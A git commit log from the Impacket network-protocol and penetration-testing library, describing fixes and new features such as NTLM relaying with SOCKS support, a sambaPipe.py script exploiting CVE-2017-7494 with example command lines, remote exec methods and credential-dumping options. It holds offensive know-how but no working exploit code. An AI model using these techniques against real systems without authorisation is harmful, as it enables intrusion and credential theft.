Merge: 1f433b3a 400ae3b4
Author: asolino <bethus@gmail.com>
Date:   Mon Aug 7 10:42:42 2017 -0300

    Merge branch 'machosec-patch-1'

commit 400ae3b43ef18768b09cdd71c1bd132193d057f0
Author: Matan Hart <matan.hart@cyberark.com>
Date:   Mon Aug 7 16:27:27 2017 +0300

    Adding SD Flags Control
    
    Implementation of the LDAP_SERVER_SD_FLAGS_OID (https://msdn.microsoft.com/en-us/library/cc223733.aspx).
    I wrote this code because by default querying the NtSecurityDescriptor attribute in Active Directory requires Domain Admin privileges. The reason for that is that AD attempts to retrieve all parts of the SD which contains the SACL (System ACL) that can be accessed only by DA privileges. When this happens AD decides to simply not return anything. To get around the limitation above and still query the NtSecurityDescriptor I specified the LDAP controls to exclude the retrieval of SACL.
    This control can also go along with the "SimplePagedResultsControl" control.

commit 1f433b3ab6598a62f47cbcee256e3a7fe7519eaf
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 2 12:31:11 2017 -0300

    Fix errors found after merging https://github.com/CoreSecurity/impacket/pull/300

commit 82758c4f731b560beb7362cc1ec868517242b370
Merge: 87407534 d4a6215a
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Aug 2 12:24:44 2017 -0300

    Merge pull request #300 from MrAnde7son/patch-1
    
    R_DhcpEnumSubnetClientsV4 and R_DhcpEnumSubnetClientsVQ

commit 87407534d86ffeee7e71829a2b16f0ff7082d918
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 2 12:21:11 2017 -0300

    Removing typo in test case

commit d4a6215aad192ebc3aac1367a93210f3297542e8
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Wed Aug 2 18:09:30 2017 +0300

    Update dhcpm.py

commit ad2ffef67c2ff97e326ea7cd7dcc1556cf8d4656
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Wed Aug 2 10:27:45 2017 +0300

    R_DhcpEnumSubnetClientsV4 and R_DhcpEnumSubnetClientsVQ
    
    Added these two. I'm sure some will find it useful :)

commit 8c8f2988d72c271bb6ef46cb016f32ed731f88ab
Author: asolino <bethus@gmail.com>
Date:   Sat Jul 29 02:57:43 2017 -0300

    Not needed anymore

commit dd2d14baaa33bf6be517e3679e8301d815d74715
Author: asolino <bethus@gmail.com>
Date:   Sat Jul 29 02:51:44 2017 -0300

    Removing debug messages

commit 5c64e6c81e0a56d898aa05c6f89196aebeca3143
Author: asolino <bethus@gmail.com>
Date:   Sat Jul 29 02:39:38 2017 -0300

    Adding plugin support for SOCKS functionality
    
    - There a base class called SocksRelay that should be used as base class for SOCKS protocol plugins
    - Any new plugin should be added to the impacket/examples/ntlmrelayx/servers/socksplugins directory
    - These plugins will be automatically loaded when the SOCKS proxy is loaded.
    - The idea is to add SockRelay plugins for any protocol we want (e.g. MSSQL, LDAP, HTTP, etc)
    - Lots of testing needed.

commit c87c3711c08b7483f03d27dc82937ec4a0080a64
Merge: cf14e7cd 71dae115
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 19 18:33:07 2017 -0300

    Merge branch 'ropnop-domain_sids'

commit 71dae11519e2f6c4a1b354230ab649da064ddc41
Author: Ronnie Flathers <rflathers@gmail.com>
Date:   Tue Jul 18 17:11:33 2017 -0500

    changed option name to reflect more than just users

commit b04f2cb6d75f12d3ac5100b0bbbbff62532d097d
Author: Ronnie Flathers <rflathers@gmail.com>
Date:   Tue Jul 18 17:57:29 2017 -0500

    added no-pass and domain-users options

commit cf14e7cd777ae41e7469fd892836912a03977552
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 14 17:52:39 2017 -0300

    Clarifications in the script's comments

commit 65f34550ed4a75f309a4db88151c6109a5afeee9
Merge: a1523f32 0ae4ab01
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 14 17:51:36 2017 -0300

    Merge branch 'ropnop-ldapchanges'

commit 0ae4ab014796ccb5f02b4db62ace308787a79cd7
Author: Ronnie Flathers <rflathers@gmail.com>
Date:   Fri Jul 14 12:47:06 2017 -0500

    added command line switch '-all-users'

commit 59b99e76c0b608c6d1d47f0a835c46b67af88aa2
Author: Ronnie Flathers <rflathers@gmail.com>
Date:   Thu Jul 13 16:22:45 2017 -0500

    removed email=* filter, added objectCategory filter)

commit a1523f32ee852b4925bb814e29d1d2a56cc9e438
Author: asolino <bethus@gmail.com>
Date:   Fri Jul 7 12:07:13 2017 -0300

    Not needed anymore

commit d7630a8f7f392f46538d853a2c8e66bb09f48b7a
Merge: d285faf2 16478813
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 6 10:34:36 2017 -0300

    Merge branch 'Gifts-dcerpc_fix'

commit 164788138e2f9ee7356c7fe85f16b166d67e5659
Merge: d285faf2 f9987592
Author: asolino <bethus@gmail.com>
Date:   Thu Jul 6 10:29:58 2017 -0300

    Merge branch 'dcerpc_fix' of https://github.com/Gifts/impacket into Gifts-dcerpc_fix

commit f9987592c285aa555ce9d680aff9585ec87ce037
Author: Gifts <giftsungiv3n@gmail.com>
Date:   Thu Jul 6 16:12:43 2017 +0300

    Fix for ENCODED_STRING class to decode UTF-16 strings

commit d285faf2eaa9d1bc74d9bd096a63e8d4b5756030
Author: asolino <bethus@gmail.com>
Date:   Wed Jul 5 11:59:25 2017 -0300

    Adding SOCKS proxy support for relayed connections
    
    * Use -socks switch when running smbrelayx.py
    * SOCKS4 and SOCKS5 should work
    * Bypass logoff attempts and sends keep alive packets to keep connections open
    * Lots of things to improve, mainly dynamic subscriptions of port handlers so we
    can add protocol handlers easier (e.g. MSSQL, HTTP, etc)
    * Testing needed. Porting to ntlmrelayx.py soon.

commit b92e438044efa888484f64fd36a28fbf61c1338e
Author: asolino <bethus@gmail.com>
Date:   Tue Jul 4 12:17:16 2017 -0300

    Removing debug print

commit 409bf10c11bcd493dfeff21311644b906edda686
Author: asolino <bethus@gmail.com>
Date:   Tue Jul 4 11:33:03 2017 -0300

    Adding echo() method.
    
    * It implements SMB_COM_ECHO functionality

commit c297ce98a4f65de194a58bb6039d19b0e9fcfac5
Author: asolino <bethus@gmail.com>
Date:   Mon Jul 3 21:22:50 2017 -0300

    Setting's LOG to current module's name
    
    * Why? So I can disable that particular module (impacket.smbserver) instead of the whole library.
    * I think I'll do it for all the modules to make it more flexible

commit 09b445bfc4701917b9c1bbc5c23188940144e76b
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 29 13:05:40 2017 -0300

    Fixing test cases under different scenarios

commit b755ca4d7cd08dea25d717f5bc26291501916caf
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 29 11:40:25 2017 -0300

    Adding -target-ip switch.
    
    - This allows to specify both the dc-ip and the target-ip. In theory we wouldn't need DNS resolve.
    - Might help addressing https://github.com/CoreSecurity/impacket/issues/285

commit 939e45bbfcb94545b7ff18071e40a7424b7cc940
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 29 11:38:38 2017 -0300

    Fixes Kerberos TGS request when IPs are manually specified.
    
    - We should use the targetName instead of the targetHost for the TGS request

commit b3826dee41f8dee2477e77b9db302aa335a07ed8
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 29 09:45:38 2017 -0300

    Print stacktrace messages if DEBUG logging is enabled
    
    - This will make things easier for troubleshooting, for example https://github.com/CoreSecurity/impacket/issues/285

commit 61ef43edc0080ab9aabab83c123146753fed6369
Author: asolino <bethus@gmail.com>
Date:   Mon Jun 19 10:57:48 2017 -0300

    Adding support for ncacn_http in hept_map

commit 74058cc0f03f4cfdd165da5bdf1fc6f8f04daaee
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 15 18:10:11 2017 -0300

    Support for RPC_IN_DATA / RPC_OUT_DATA requests (ncacn_http DCERPC transport).
    
    * RelayServer runs: ./ntlmrelayx.py -t <targetServer>  (optionally add -i and interactive shells will be available)
    * Victim runs: rpcping -s <relayServer> -t ncacn_http -u 10 -a connect -H 2
    * TargetServer: profit
    
    Testing needed!

commit 371a9a80c867d7db17b09cb5b080686dda0a0761
Author: asolino <bethus@gmail.com>
Date:   Thu Jun 15 13:46:15 2017 -0300

    First try at supporting RPC_IN_DATA / RPC_OUT_DATA
    
    * Testing needed.. Might break things
    * Whenever it's ready I'll add it to ntlmrelayx.py

commit b7813a917f9ade3fa8674d7066a69752d827be2f
Author: asolino <bethus@gmail.com>
Date:   Wed Jun 14 12:23:19 2017 -0300

    Increasing wait time when deleting files

commit ea0b341ad18466b42242be1e32486177f76b2cbc
Merge: d01b27cf 0a78476e
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Jun 12 13:01:09 2017 -0300

    Merge pull request #281 from fox-it/ntlmrelayx-targets
    
    Improved SMB server target processing and LDAP client error handling

commit d01b27cf2abc130805e3d9d1abea163a7ec09e1c
Merge: 66a02c8e 179b3dd8
Author: asolino <bethus@gmail.com>
Date:   Mon Jun 12 12:59:29 2017 -0300

    Merge branch 'Fr0stbyt3-master'

commit 0a78476e3b2a6b0054205a799631f852b532e87f
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sun Jun 11 12:30:44 2017 +0200

    Improved SMB server target processing and LDAP client error handling

commit 179b3dd82fc68fe601f30f260c501a6872d6ad16
Author: Fr0stbyt3 <fr0stbyt3.dev@gmail.com>
Date:   Sat Jun 10 14:22:04 2017 -0400

    Minor adjustments

commit 024c80179c35b08f0689a272e7e60eae03b2b6bc
Author: Fr0stbyt3 <fr0stbyt3.dev@gmail.com>
Date:   Sat Jun 10 14:15:35 2017 -0400

    Fixed typo

commit 149f5022132db3a05c79c3a3f6e894c3eb4a10bc
Author: Fr0stbyt3 <fr0stbyt3.dev@gmail.com>
Date:   Sat Jun 10 14:13:05 2017 -0400

    Added definitions for SMB 3.0.2 and SMB 3.1.1 dialects, added definition for the SMB2_SEC_INFO_00 infoLevel, added struct for use in responding to SMB2_SEC_INFO_00 queries

commit 66a02c8ed37250b501089f3ecf4e12bd9be3dea6
Author: asolino <bethus@gmail.com>
Date:   Sat Jun 10 11:48:56 2017 -0300

    Building a TargetsProcessor class when it was not specified (e.g. REFLECTION mode)
    
    * Now it default to reflecting back to SMB
    * It should address https://github.com/CoreSecurity/impacket/issues/278

commit a5af417c70c6fe0aca964cb584b8f80338135ef4
Author: asolino <bethus@gmail.com>
Date:   Fri Jun 9 12:04:39 2017 -0300

    Changing default encoding if -codec if not specified
    
    * Should fix https://github.com/CoreSecurity/impacket/issues/260

commit 5f8f84e9487f349f3d538b573e381add117263b5
Author: asolino <bethus@gmail.com>
Date:   Fri Jun 9 11:16:45 2017 -0300

    Better (hopefully) codec support

commit 287cb2fe2cf76c80f551a70ccf0e00e3c8ccc085
Author: asolino <bethus@gmail.com>
Date:   Wed Jun 7 16:27:40 2017 -0300

    Support for samba 3.5.x
    
    * In those versions, the first byte is stripped, hence we're sending a '/' extra at the beginning of the buffer
    * Doesn't seem to affect 4.x versions
    * Also, have in mind that in 3.5.x you need to create a .so exporting init_samba_module(), whereas in 4.x it is samba_init_module()

commit 533413049640d275f5d4080c7a921c39a0e2dc43
Author: asolino <bethus@gmail.com>
Date:   Wed Jun 7 12:31:15 2017 -0300

    Adding pyreadline only when install platform is Windows
    
    * Should fix https://github.com/CoreSecurity/impacket/issues/261

commit 78dfa8ca893c472c99336004e5f25eaf9fad0836
Merge: 9733943d ae741379
Author: asolino <bethus@gmail.com>
Date:   Mon Jun 5 17:49:24 2017 -0300

    Merge branch 'franferrax-master'

commit ae741379dc02e68e3d2a431a0d3ba93fc33926db
Author: asolino <bethus@gmail.com>
Date:   Mon Jun 5 17:48:28 2017 -0300

    Let's raise an exception if the provided resume file does not exist

commit 0bee4c85514a38d2c44e502a4737411fde59ed39
Author: asolino <bethus@gmail.com>
Date:   Mon Jun 5 17:38:06 2017 -0300

    No need to open a file know we have to resumeData
    
    * After that, we'll need to open the file twice since we need to have it wb+ at the end.

commit 065aae679512a8a7b153c256aaa85bef482f38ac
Author: asolino <bethus@gmail.com>
Date:   Mon Jun 5 17:03:29 2017 -0300

    Fixes small bugs in new resume class refactor
    
    * We need self.__resumeFile to point to something not None when resuming a session
    * truncate() doesn't work if you open the file with 'r' (at least in macOS)

commit 717cd675e6558f4ca2c8189182cb853d3c904f0c
Author: fferrari <fferrari@coresecurity.com>
Date:   Mon Jun 5 14:44:26 2017 -0300

    Resume file encapsulated in ResumeSessionMgrInFile class, more flexibility as we can now pass an external manager for the session. No interface changes for NTDSHashes class clients (except for the optional resumeSessionMgr parameter).

commit 1ca1885f397fef44f2bf34868f5c4e46220df126
Author: fferrari <fferrari@coresecurity.com>
Date:   Mon Jun 5 14:38:23 2017 -0300

    Decide if we can perform a remote operation depending on the provided __remoteOps capabilities.

commit af46638c0b4b1f2e904faaa7212f1fb6ab1b69d2
Author: fferrari <fferrari@coresecurity.com>
Date:   Mon Jun 5 14:36:34 2017 -0300

    Independent __perSecretCallback for LSA RAW secrets.

commit 9733943d589d3438efe2d09f2c7425dfce67e900
Author: asolino <bethus@gmail.com>
Date:   Sat Jun 3 19:29:26 2017 -0300

    Adding -exec-method
    
    * Allows to chose different exec methods when -use-vss mode is chosen:
    1. smbexec (default): Creates a service executing the desired commands
    2. wmiexec: Executes commands through Win32Process.Create() API
    3. mmcexec: Executes commands through DCOM MMC object (Kerberos not supported here)

commit ea6df99e49ba08651ab537f870f4e2128c7ca95f
Author: asolino <bethus@gmail.com>
Date:   Tue May 30 22:18:23 2017 -0300

    Opening the file as binary to make Windows happy
    
    * Thanks @gentilkiwi for the tests
    * More verbose message when receiving the answer from the server

commit aa23896d95c76b4ede751bf3ae3e9d0a6d94935d
Author: asolino <bethus@gmail.com>
Date:   Tue May 30 18:00:55 2017 -0300

    If no command is specified we should exit.
    
    * There's no interactive shell with this script. Command is needed

commit 32e71ef2369b10d8eaf2cf5a909252727e21f82d
Author: asolino <bethus@gmail.com>
Date:   Mon May 29 15:48:41 2017 -0300

    Adding sambaPipe example
    
    This script will exploit CVE-2017-7494, uploading and executing the shared library specified by the user through
    the -so parameter.
    
    The script will use SMB1 or SMB2/3 depending on the target's availability. Also, the target share pathname is
    retrieved by using NetrShareEnum() API with info level 2.
    
    Example:
    
    ./sambaPipe.py -so poc/libpoc.linux64.so bill@10.90.1.1
    
    It will upload the libpoc.linux64.so file located in the poc directory against the target 10.90.1.1. The username
    to use for authentication will be 'bill' and the password will be asked.
    
    ./sambaPipe.py -so poc/libpoc.linux64.so 10.90.1.1
    
    Same as before, but anonymous authentication will be used.

commit ee57caec3313a253fb0b18c48502a2c4cde7d6cc
Author: asolino <bethus@gmail.com>
Date:   Mon May 29 13:25:51 2017 -0300

    Trying to detect the type of format offered when called with -just-dc-user
    
    Depending on the input received, we need to change the formatOffered before calling
    DRSCrackNames.
    There are some instances when you call -just-dc-user and you receive ERROR_DS_NAME_ERROR_NOT_UNIQUE
    That's because we don't specify the domain for the user (and there might be duplicates)
    Always remember that if you specify a domain, you should specify the NetBIOS domain name,
    not the FQDN. Just for this time. It's confusing I know, but that's how this API works
    
    If you receive ERROR_DS_NAME_ERROR_NOT_UNIQUE try calling the script again with <NetBIOS Domain Name>/<username> format

commit 0f25e86058fa1580e198e94e0c63a5abec1226ea
Author: asolino <bethus@gmail.com>
Date:   Mon May 29 11:24:23 2017 -0300

    Enhancing our way to find if share is writable
    
    * We just try to open the share with write permissions
    * Some cosmetic changes added as well

commit 754ee112e525ec1842115b9001fa5535e31e403d
Author: asolino <bethus@gmail.com>
Date:   Sun May 21 21:37:26 2017 -0300

    Adding AES as a possible cipher for TLS session.
    
    * In case RC4 is not present
    * Should address https://github.com/CoreSecurity/impacket/issues/269, needs checking

commit 6a762a23859d270069cee2ff52d74e6e24c60910
Author: asolino <bethus@gmail.com>
Date:   Fri May 19 12:10:16 2017 -0300

    Fix when checking logging level for printing some debug information

commit 299442fdb73d14941c74eff6b8986c13aa4ffe7a
Author: asolino <bethus@gmail.com>
Date:   Tue May 16 15:08:03 2017 -0300

    Fix for DCE disconnect
    
    * I wasn't checking right if the dce connection needed to be disconnected or not. In theory, if a connection is specified external to the function, we should NOT disconnect it.

commit 61b8487be985ffc6c61950881a556a98eb533a3f
Author: asolino <bethus@gmail.com>
Date:   Mon May 8 20:34:34 2017 -0300

    Initial [MS-DHCPM] Interface implementation
    
    * And testcases

commit 52fad83d8ec950e7d1427bf9a7fd1796134de190
Author: asolino <bethus@gmail.com>
Date:   Mon May 1 07:26:47 2017 -0700

    Fixes SMB Transaction related code
    
    * Missing field in SMBTransaction2Secondary_Parameters structure
    * Wrong pack usage when processing setup bytes for a  SMB_COM_NT_TRANSACT

commit 0cc150e599d1826573505e8ba110bf95bd05e2d7
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 21 12:48:07 2017 -0300

    Setting some parameters as required
    
    * Since they are required ;)

commit 44a436e35309db43927a6c7cadb92dae5e3bdbd2
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 21 12:37:41 2017 -0300

    Quick and dirty fix for 'not' filters and pyasn1-0.2.3
    
    * Until we figure out the main reason
    * In the context of https://github.com/CoreSecurity/impacket/issues/264

commit aa4f1ca597e83ad9be240dfef0aca8292b0004a2
Merge: 8ca4065e 9bb51a30
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Apr 17 12:58:25 2017 -0300

    Merge pull request #263 from fox-it/krbfix
    
    Fix in toTGT with wrong tag

commit 9bb51a305e08699653832fdb6c5bb1ff15d8b51c
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Thu Apr 13 10:52:52 2017 +0200

    Fix in toTGT with wrong tag

commit 8ca4065ed8f29f4b68e67bd7d1da73cc940d5755
Author: asolino <bethus@gmail.com>
Date:   Tue Apr 4 19:54:38 2017 -0300

    Adding AES128_GCM constant

commit cf246b593f58b863e79e93228351c063b2b3e598
Author: asolino <bethus@gmail.com>
Date:   Sat Apr 1 17:08:39 2017 -0400

    Forgot to decode the stdin command received by the user.
    
    * Should address https://github.com/CoreSecurity/impacket/issues/260

commit 4757b0d225f0bcab17195decccab11a45d1c2ea5
Author: asolino <bethus@gmail.com>
Date:   Wed Mar 22 18:21:53 2017 -0300

    Adjusting to univ.Sequence.setComponentByPosition new signature (pyasn1-0.2.3)
    
    * Should address https://github.com/CoreSecurity/impacket/issues/259
    * We should test it doesn't generate any side effect (in theory not)

commit 6b7514a0d8b84948de4adc365866943cb883bbbb
Author: asolino <bethus@gmail.com>
Date:   Tue Mar 21 21:00:45 2017 -0300

    Using the same SMB Connection when binding to EPM and MIMI
    
    * No need to create two separate ones
    * Fixed a bug in EPM that would disconnect the SMB Server

commit 067c871807156fd072733c651de86c5be3b05354
Author: asolino <bethus@gmail.com>
Date:   Tue Mar 21 18:26:21 2017 -0300

    Doing epm search thru SMB if possible

commit e9ed12e6aad1fd6300a0c8e0cccd8a4ad23d84e1
Author: asolino <bethus@gmail.com>
Date:   Tue Mar 21 16:47:35 2017 -0300

    Forgot to switch to Kerberos (in the right way) when -k is specified
    
    * Also, when possible, use ncacn_np

commit f62fc5c3946430374f92404e892f8c48943d411c
Author: asolino <bethus@gmail.com>
Date:   Tue Mar 21 10:14:05 2017 -0300

    If target server supports SMB >= 3, encrypt packets by default.
    
    * Unless pycrypto experimental is not installed :(

commit b7c35ec9b6624657615ddf0fbca1f5bde2c40ddd
Author: asolino <bethus@gmail.com>
Date:   Sun Mar 19 16:14:22 2017 -0300

    Mini shell to control a remote mimikatz RPC server developed by @gentilkiwi
    
    * Inital version. Several interesting things to add in the future :)

commit 0e80fa91378cf0d293acf4d2978e3f21526d9f4e
Author: asolino <bethus@gmail.com>
Date:   Tue Mar 14 13:13:47 2017 -0300

    Adding getArch.py example
    
    This script will connect against a target (or list of targets) machine/s and gather the OS architecture type
    installed.
    The trick has been discovered many years ago and is actually documented by Microsoft here:
    https://msdn.microsoft.com/en-us/library/cc243948.aspx#Appendix_A_53
    and doesn't require any authentication at all.
    
    Have in mind this trick will *not* work if the target system is running Samba. Don't know what happens with macOS.

commit 763fcc57cc32ed8e4b507ac63f205ab0f502ffd8
Author: asolino <bethus@gmail.com>
Date:   Mon Mar 6 14:49:11 2017 -0300

    Forgot to add this file too to previous commit (https://github.com/CoreSecurity/impacket/commit/b9ec8241b81a0c45cd833e5bed4e2ae708905fe8)

commit b9ec8241b81a0c45cd833e5bed4e2ae708905fe8
Author: asolino <bethus@gmail.com>
Date:   Mon Mar 6 14:42:43 2017 -0300

    Chaning Service Ticket sname if it doesn't match what we want
    
    * It might not work if the ST isn't encrypted for the same user as the new SPN.

commit 0ddd7b140cb0fc6c83e0c83d9ec0f35607d8398e
Author: asolino <bethus@gmail.com>
Date:   Wed Mar 1 18:13:00 2017 -0300

    Adding copyright for 2017

commit 441e91552927286624609501be3ea5384d5ea80e
Author: asolino <bethus@gmail.com>
Date:   Fri Feb 24 11:55:00 2017 -0300

    Adding -codec parameter
    
    * Sets encoding used (codec) from the target's output (default "ascii").
    If errors are detected, run chcp.com at the target, map the result with
    https://docs.python.org/2.4/lib/standard-encodings.html and then execute
    wmiexec.py again with -codec and the corresponding codec.
    Especially useful when running this script against non-english systems.
    
    * It can be used also by other protocols, since the encoding chosen is set in the NTLMRelayxConfig instance.
    
    * Adds on top https://github.com/CoreSecurity/impacket/commit/589490d8c8cd2bba10321c8fce9f2e1fa8c3a408#commitcomment-21015813 that was only for smbrelayx.py

commit 7099431abd3ed6fbc3555973cf064484f354938c
Author: asolino <bethus@gmail.com>
Date:   Fri Feb 24 11:10:59 2017 -0300

    Nicer coding :)

commit 07a897fa968dc97f40a5c360a46d728f16ca66e5
Author: asolino <bethus@gmail.com>
Date:   Thu Feb 23 21:52:21 2017 -0300

    Droping int() and str(), not needed.

commit c81404999693a0faa9ac94375e347ba8e9512a0d
Author: asolino <bethus@gmail.com>
Date:   Thu Feb 23 10:21:43 2017 -0300

    Adding support LDAP paged search support to GetADUsers.py
    
    * Will now work when there are more than 1000 records
    * Also fixes a small bug in the library when decoding the cookies

commit 589490d8c8cd2bba10321c8fce9f2e1fa8c3a408
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 22 10:10:55 2017 -0300

    Adding -codec parameter
    
    * Sets encoding used (codec) from the target's output (default "ascii").
    If errors are detected, run chcp.com at the target, map the result with
    https://docs.python.org/2.4/lib/standard-encodings.html and then execute
    wmiexec.py again with -codec and the corresponding codec.
    Especially useful when running this script against non-english systems.
    
    * Addresses https://github.com/CoreSecurity/impacket/issues/254

commit 8abc3f2e71df4ef4ffdca11a75134fd82a0d2918
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 21 20:15:20 2017 -0300

    Fixed wrong expected values in KDC_REP
    
    * It was triggering a ValueConstraintError with pyasn1-0.2.2 (looks like it now checks that)
    * Updating setup.py as well

commit 6826ececc75debcf37ad8581388798bcfe9eb079
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 21 20:02:11 2017 -0300

    Updating setup.py with the pyasn1 version we know we work against
    
    * Newer versions might not work (0.2.2 does not work)

commit 6c34701623172c64e61e920c59a79a73eeafd7b7
Author: asolino <bethus@gmail.com>
Date:   Mon Feb 20 17:48:26 2017 -0300

    Adding -codec parameter
    
    * Sets encoding used (codec) from the target's output (default "ascii").
    If errors are detected, run chcp.com at the target, map the result with
    https://docs.python.org/2.4/lib/standard-encodings.html and then execute
    wmiexec.py again with -codec and the corresponding codec.
    
    Especially useful when running this script against non-english systems.

commit 1e26b895b1da1699c336c30156404eb0ebf8543a
Author: asolino <bethus@gmail.com>
Date:   Mon Feb 20 15:20:27 2017 -0300

    Removing SMB() and SMB3() destructor
    
    * Not needed, replaced by close_session()

commit 17d82cb6a8b9d15d50557a3df159248819d5cb78
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 8 19:22:26 2017 -0300

    Performance improvement in DRSGetNCChanges request
    
    We're now calling DRSCrackNames() with formatDesired DS_UNIQUE_ID_NAME instead of former DS_FQDN_1779_NAME.  DS_UNIQUE_ID_NAME has a fixed size (16) whereas DS_FQDN_1779_NAME is variable (depending on the target domain). This is used when calling DRSGetNCChanges().
    In my tests I'm saving around 20% of the request's size (364 gainst 292 bytes)
    
    Thanks @gentilkiwi for pointing it out :)

commit 92ce1de823a01514ba488e912fa4f50a8e9944c9
Merge: 2f69f933 574e3b42
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Feb 6 11:28:12 2017 -0300

    Merge pull request #250 from skelsec/master
    
    Adding DES-CBC-MD5 support to kerberos

commit 574e3b42a0d877832f667b99d82cef08a9e9b635
Author: skelsec <info@skelsec.com>
Date:   Sun Feb 5 07:35:10 2017 -0800

    Adding DES-CBC-MD5 support to kerberos
    
    yes, it uses string-bit conversion to bit manipulation
    yes, there is possible a better way to deal with DES keys
    yes, it was tested against actual windows servers (2016 and 2008)
    no, I wasn't drunk when writing this

commit 2f69f9330d8dd86b086f3c7f98ad4e4f015c45f6
Author: asolino <bethus@gmail.com>
Date:   Thu Feb 2 15:38:53 2017 -0300

    Typo on Ben's surname
    
    :)

commit 5a6e2475858a6a28991fde0a99085e0bb05a6c80
Author: asolino <bethus@gmail.com>
Date:   Thu Feb 2 11:40:54 2017 -0300

    Adding getPac.py example
    
    This script will get the PAC of the specified target user just having a normal authenticated user credentials.
    It does so by using a mix of [MS-SFU]'s S4USelf + User to User Kerberos Authentication.
    Original idea (or accidental discovery :) ) of adding U2U capabilities inside a S4USelf by Benjamin Delphi (@gentilkiwi)
    
    References:
    
    U2U: https://tools.ietf.org/html/draft-ietf-cat-user2user-02
    [MS-SFU]: https://msdn.microsoft.com/en-us/library/cc246071.aspx

commit 03c5bc63bc8bf98cff84770f1231a0922fcbebab
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 25 09:35:09 2017 -0300

    Giving some hints when target is enforcing SPN validation

commit f0b5b8f6174ba9cfebef66d1bdaab8a776773c61
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 24 16:10:29 2017 -0300

    Be more flexible about the target SPN to use
    
    * When connecting to target systems
    * Also, don't give up if the SMBConnection didn't work, we might be still lucky at the DRSUAPI layer

commit 6a49832e2b8fad4e5238b7d35bc8eb057e31eef8
Author: martin_uy <m@rtin.uy>
Date:   Mon Jan 23 18:56:32 2017 -0300

    In the context of #69:
     * Import missing

commit 37e40a732e5592b43f5678ef8e8bed7ffff66e81
Author: martin_uy <m@rtin.uy>
Date:   Mon Jan 23 18:53:32 2017 -0300

    In the context of Issue #69:
     * IPv6 interface aligned to IPv4 interface.

commit f2d6f634d20cab10db9635e95f2398ba3e65943f
Author: asolino <bethus@gmail.com>
Date:   Fri Jan 20 12:32:03 2017 -0300

    Retrieve the username based on the specific TGT/TGS retrieved from ccache
    
    * In the case where there is more than a single ticket, there could be different client names. Especially if there are tickets with delegation
    * Improved debug info to identify mismatches in the future

commit dbc38254154e7fb44357d2bebaad27d912e69fb0
Merge: ccdb867b 4f5154ab
Author: Rohit Mahamuni <contactr2m@gmail.com>
Date:   Mon Jan 16 08:35:39 2017 -0500

    Merge remote-tracking branch 'CoreSecurity/master'

commit 4f5154ab2602cf5e9d5da993324def1cd78538d2
Author: asolino <bethus@gmail.com>
Date:   Sun Jan 15 17:03:34 2017 -0300

    Include 'KRB5 - Kerberos 5' OID inside the GSSAPI MechToken
    
    * We were just including the mechTypes, but looks like it is also needed inside the MechToken
    * Windows doesn't care about it, but Samba / NetApp servers do.
    * Should address https://github.com/CoreSecurity/impacket/issues/247

commit fb280b1213b505b5dba4ce6f9099be28cfe489ad
Merge: 1a12a2d8 a86c480d
Author: martin_uy <m@rtin.uy>
Date:   Thu Jan 12 14:24:01 2017 -0300

    Merge branch 'master' of https://github.com/CoreSecurity/impacket

commit 1a12a2d88f3f63c39c765c9fa6373818c50cda00
Author: martin_uy <m@rtin.uy>
Date:   Thu Jan 12 14:23:43 2017 -0300

    In the context of merging pull request #92, we removed the code on UDP decoder that does DHCP decoding based on port numbers. Even though it's a valid heuristic to determine the layer following UDP based on port numbers -and it's going to work in most of the cases, as DHCP services usually run on a well known port that it's not used for any other protocols-, we still want to handle the cases in which those well known ports are used for a different protocol. In this later case, the decoder has to be DataDecoder instead of DHCP Decoder. As a result, is up to the ImpactDecoder client to decide which decoder has to be used for the layers following UDP or TCP, as there is not an unambiguous way of determining that.

commit e978eca9e2b3d455ca73b8291772746e5fa41075
Merge: 0ff281f0 9879f1b6
Author: martin_uy <m@rtin.uy>
Date:   Thu Jan 12 14:12:43 2017 -0300

    Merge branch 'c0d3z3r0-feature/dhcp'

commit 9879f1b676e0620b4a1b2e95e71e64d29f8290cc
Merge: 0ff281f0 c8aabf28
Author: martin_uy <m@rtin.uy>
Date:   Thu Jan 12 14:12:19 2017 -0300

    Merge branch 'feature/dhcp' of https://github.com/c0d3z3r0/impacket into c0d3z3r0-feature/dhcp

commit ccdb867b9884af1cbf790f174180e6c90d9c6c91
Author: Rohit Mahamuni <contactr2m@gmail.com>
Date:   Wed Jan 11 15:13:11 2017 -0500

    https://github.com/CoreSecurity/impacket/issues/236
    
    SessionError exception not populating packet info in SMBConnection
    wrapper.

commit 517a1748b467c418d0918d5fc8f457aa0525b4bf
Merge: f78c5e17 a86c480d
Author: Rohit Mahamuni <contactr2m@gmail.com>
Date:   Wed Jan 11 14:39:55 2017 -0500

    Merge remote-tracking branch 'CoreSecurity/master'

commit a86c480d64f84ca2b6944068f82119a39e5f049d
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 11 13:24:14 2017 -0300

    Restoring commented structure items
    
    * Problem wasn't padding related (thanks god) for a definition of an EMPTY NDR structure.

commit fc65d6b475c077806493028d6ae4bdd71e321824
Merge: e5b1968a 6ca48d58
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 11 12:56:13 2017 -0300

    Merge branch 'martingalloar-virtualenv-friendly'

